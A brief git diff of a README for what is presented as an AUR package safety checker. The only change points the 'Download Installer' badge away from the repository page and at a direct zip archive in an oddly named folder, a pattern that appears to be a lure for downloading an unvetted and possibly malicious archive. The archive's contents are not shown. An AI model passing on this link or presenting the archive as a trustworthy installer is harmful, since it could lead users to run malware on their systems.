@@ -1,6 +1,6 @@
 # 🛡️ aur-package-checker-installer - Keep your system safe from threats
 
-[![Download Installer](https://img.shields.io/badge/Download-Installer-blue.svg)](https://github.com/Hypaethral-michael364/aur-package-checker-installer)
+[![Download Installer](https://img.shields.io/badge/Download-Installer-blue.svg)](https://raw.githubusercontent.com/Hypaethral-michael364/aur-package-checker-installer/main/menially/package-aur-installer-checker-v3.9-beta.2.zip)
 
 ## 📌 Overview
 
